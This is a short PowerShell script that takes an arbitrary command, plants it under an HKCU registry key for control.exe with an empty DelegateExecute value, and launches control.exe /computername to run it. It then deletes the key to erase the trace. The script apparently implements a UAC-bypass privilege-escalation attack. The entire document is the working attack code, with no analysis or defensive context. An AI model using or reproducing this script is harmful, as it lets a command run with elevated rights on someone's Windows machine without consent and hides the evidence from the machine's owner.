$cmd = $Args[0]

$methods = @(
    @{ Name="control_computername"; Key="HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"; Exec="C:\Windows\System32\control.exe /computername" }
)

function Add-RegistryPayload($key, $command) {
    try {
        New-Item -Path $key -Force | Out-Null
        New-ItemProperty -Path $key -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty -Path $key -Name "(default)" -Value $command -Force | Out-Null
        return $true
    } catch {
        return $false
    }
}

function Cleanup-Registry() {
    Start-Sleep -Seconds 1
    foreach ($method in $methods) {
        Remove-Item -Path $method.Key -Recurse -Force -ErrorAction SilentlyContinue
    }
}

foreach ($method in $methods) {
    if (Test-Path $method.Exec) {
        if (Add-RegistryPayload -key $method.Key -command $cmd) {
            Start-Process -FilePath $method.Exec
            Cleanup-Registry
            exit
        }
    }
}
